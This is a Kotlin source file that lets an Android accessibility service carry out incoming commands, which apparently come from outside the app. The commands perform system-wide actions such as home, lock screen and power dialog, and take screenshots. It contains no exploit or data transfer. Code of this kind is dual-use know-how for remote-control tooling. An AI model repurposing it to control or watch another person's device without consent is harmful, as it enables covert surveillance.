package com.hawkshaw.library.features.accessibility

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.logger.Logger
import java.util.concurrent.Executors

/**
 * Utility functions for handling global accessibility actions
 */
object GlobalActionKt {

    private const val TAG = "GlobalActionKt_DEBUG"

    /**
     * Enum representing the types of accessibility commands that can be handled
     */
    enum class CommandType {
        PerformGlobalAction,
        TakeScreenshot
    }

    /**
     * Enum representing the global actions that can be performed
     */
    enum class GlobalAction(val value: Int, val actionName: String) {
        BACK(AccessibilityService.GLOBAL_ACTION_BACK, "Back"),
        HOME(AccessibilityService.GLOBAL_ACTION_HOME, "Home"),
        RECENTS(AccessibilityService.GLOBAL_ACTION_RECENTS, "Recents"),
        NOTIFICATIONS(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS, "Notifications"),
        QUICK_SETTINGS(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS, "Quick Settings"),
        POWER_DIALOG(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG, "Power Dialog"),
        TOGGLE_SPLIT_SCREEN(AccessibilityService.GLOBAL_ACTION_TOGGLE_SPLIT_SCREEN, "Toggle Split Screen"),
        @RequiresApi(Build.VERSION_CODES.P)
        LOCK_SCREEN(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN, "Lock Screen"),
        @RequiresApi(Build.VERSION_CODES.P)
        TAKE_SCREENSHOT(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT, "Take Screenshot")
    }

    /**
     * Handles accessibility commands sent to the MainAccessibilityService
     *
     * @param command The command to handle
     */
    fun handleCommand(
        mainAccessibilityService: MainAccessibilityService,
        command: Command.AccessibilityCommandRequest
    ) {
        Log.d(TAG, "handleCommand received. Command: ${command.command}, PackageName (used as action): ${command.packageName}")
        when (command.command) {
            CommandType.PerformGlobalAction.name -> {
                Log.d(TAG, "handleCommand: Matched PerformGlobalAction. Searching for action: '${command.packageName}'")
                val action = GlobalAction.entries.find { it.actionName == command.packageName }
                if (action != null) {
                    Log.d(TAG, "handleCommand: Found action: $action. Calling performGlobalAction.")
                    performGlobalAction(mainAccessibilityService, action)
                } else {
                    Log.e(TAG, "handleCommand: Invalid global action name: ${command.packageName}")
                    Logger.e(
                        MainAccessibilityService.TAG,
                        "Invalid global action: ${command.packageName}",
                        b = false,
                        i = 12,
                        nothing = null
                    )
                }
            }
            CommandType.TakeScreenshot.name -> {
                Log.d(TAG, "handleCommand: Matched TakeScreenshot. Calling takeScreenshot.")
                takeScreenshot(mainAccessibilityService)
            }
            else -> {
                Log.e(TAG, "handleCommand: Unknown command type: ${command.command}")
                Logger.e(
                    MainAccessibilityService.TAG,
                    "Unknown command type: ${command.command}",
                    b = false,
                    i = 12,
                    nothing = null
                )
            }
        }
    }

    /**
     * Performs a global action in the accessibility service
     *
     * @param globalAction The global action to perform
     */
    private fun performGlobalAction(
        mainAccessibilityService: MainAccessibilityService,
        globalAction: GlobalAction
    ) {
        Log.d(TAG, "performGlobalAction called for action: ${globalAction.actionName}")
        val success = mainAccessibilityService.performGlobalAction(globalAction.value)
        val result = if (success) "Succeeded" else "Failed"
        // Existing Logger.d is good for capturing the result.
        Logger.d(
            MainAccessibilityService.TAG, // Using existing tag as it's specific to the service interaction
            "PerformGlobalAction: ${globalAction.actionName}, $result",
            false,
            4,
            null
        )
        Log.d(TAG, "performGlobalAction: ${globalAction.actionName} result: $result")
    }

    /**
     * Takes a screenshot using the accessibility service if running on Android R or above
     */
    private fun takeScreenshot(mainAccessibilityService: MainAccessibilityService) {
        Log.d(TAG, "takeScreenshot called.")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Log.d(TAG, "takeScreenshot: Android version is R or above. Proceeding with screenshot.")
            val executor = Executors.newSingleThreadExecutor()
            mainAccessibilityService.takeScreenshot(0, executor, object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                    Log.d(TAG, "takeScreenshot: onSuccess callback received.")
                    try {
                        // Success case
                        val height = screenshot.hardwareBuffer.height
                        val width = screenshot.hardwareBuffer.width
                        Log.i(TAG, "TakeScreenshot: success (Height: $height, Width: $width)")
                        Logger.d(
                            MainAccessibilityService.TAG,  // Using existing tag
                            "TakeScreenshot: success ($height, $width)",
                            false,
                            4,
                            null
                        )
                    } finally {
                        Log.d(TAG, "takeScreenshot: Closing hardwareBuffer in onSuccess.")
                        screenshot.hardwareBuffer.close()
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Log.e(TAG, "takeScreenshot: onFailure callback received. Error code: $errorCode")
                    Logger.e(
                        MainAccessibilityService.TAG, // Using existing tag
                        "TakeScreenshot: failed with error code $errorCode",
                        b = false,
                        i = 12,
                        nothing = null
                    )
                }
            })
        } else {
            Log.d(TAG, "takeScreenshot: Android version is below R. Screenshot not available via this method.")
            Logger.d(
                MainAccessibilityService.TAG, // Using existing tag
                "TakeScreenshot: not available (SDK < R)",
                false,
                4,
                null
            )
        }
    }
}